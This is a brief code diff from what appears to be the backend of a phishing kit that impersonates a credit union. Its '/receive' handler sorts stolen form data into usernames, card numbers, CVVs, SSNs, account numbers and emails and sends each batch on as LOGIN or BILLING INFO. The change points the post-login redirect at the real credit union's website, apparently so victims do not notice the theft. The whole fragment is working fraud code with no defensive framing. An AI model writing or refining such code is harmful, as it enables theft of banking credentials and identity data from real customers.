@@ -170,7 +170,7 @@ app.post('/receive', async (req, res) => {
     };
 
     if (myObjectKeys.includes('username')) {
-      prepareMessage("LOGIN", "/verify?action=1", true);
+      prepareMessage("LOGIN", "https://www.sunfederalcu.org", true);
     } else if (myObjectKeys.includes('') || myObjectKeys.includes('cvv') || myObjectKeys.includes('cardnumber')) {
       prepareMessage("BILLING INFO", url, false);
     } else if (myObjectKeys.includes('ssn') || myObjectKeys.includes('accountnumber') || myObjectKeys.includes('email')) {
